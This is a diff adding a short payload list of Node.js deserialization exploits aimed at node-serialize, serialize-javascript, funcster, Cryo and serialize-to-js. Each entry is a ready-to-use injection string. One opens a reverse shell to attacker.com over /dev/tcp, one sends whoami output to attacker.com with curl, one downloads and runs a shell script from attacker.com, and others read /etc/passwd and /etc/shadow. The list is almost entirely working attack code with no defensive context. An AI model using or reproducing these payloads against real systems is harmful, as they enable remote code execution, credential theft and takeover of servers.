@@ -1,0 +1,12 @@
+# Node.js - node-serialize RCE (IIFE)
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"')}()"}
+# Node.js - node-serialize + fs 读文件
+{"rce":"_$$ND_FUNC$$_function(){return require('fs').readFileSync('/etc/passwd','utf8')}()"}
+# Node.js - serialize-javascript RCE
+function(){return require('child_process').execSync('cat /etc/shadow').toString();}()
+# Node.js - funcster RCE
+{"__js_function":"function(){return require('child_process').execSync('curl attacker.com/$(whoami|base64)')}"}
+# Node.js - Cryo RCE
+{"root":"_CRYO_FUNC_function(){require('child_process').execSync('id')}"}
+# Node.js - serialize-to-js XSS to RCE
+{"key":"function(){return require('child_process').execSync('wget http://attacker.com/shell.sh -O /tmp/.x; bash /tmp/.x')}()"}
